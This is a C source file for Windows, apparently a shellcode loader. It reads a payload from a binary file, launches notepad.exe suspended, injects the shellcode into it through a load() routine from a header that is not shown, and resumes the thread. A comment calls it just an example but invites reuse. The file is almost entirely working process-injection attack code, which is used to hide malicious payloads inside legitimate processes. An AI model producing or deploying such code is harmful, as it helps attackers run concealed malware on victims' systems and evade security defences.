#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#include "loader.h"

//
//  This wasn't made to be used, it's just an example
//  But if you would like to use some scripts, you're more than welcome.
//

unsigned char* Shellcode(const char *fn, size_t *size) {
    FILE *f = fopen(fn, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    *size = ftell(f);
    rewind(f);

    unsigned char *buffer = (unsigned char*)malloc(*size);
    if (!buffer) { fclose(f); return NULL; }

    fread(buffer, 1, *size, f);
    fclose(f);
    return buffer;
}

int main() {
    size_t size;
    const char* payload = "isell.bin";

    unsigned char *shellcode = Shellcode(payload, &size);
    if (!shellcode) {
        printf("[!] Failed to load shellcode\n");
        return 1;
    }

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[!] Failed to start notepad\n");
        return 1;
    }

    if (load(shellcode, size, pi.dwProcessId)) {
        printf("[+] Shellcode injected successfully into PID %d\n", pi.dwProcessId);
        ResumeThread(pi.hThread); 
    } else {
        printf("[!] Injection failed\n");
        TerminateProcess(pi.hProcess, 1);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(shellcode);

    return 0;
}
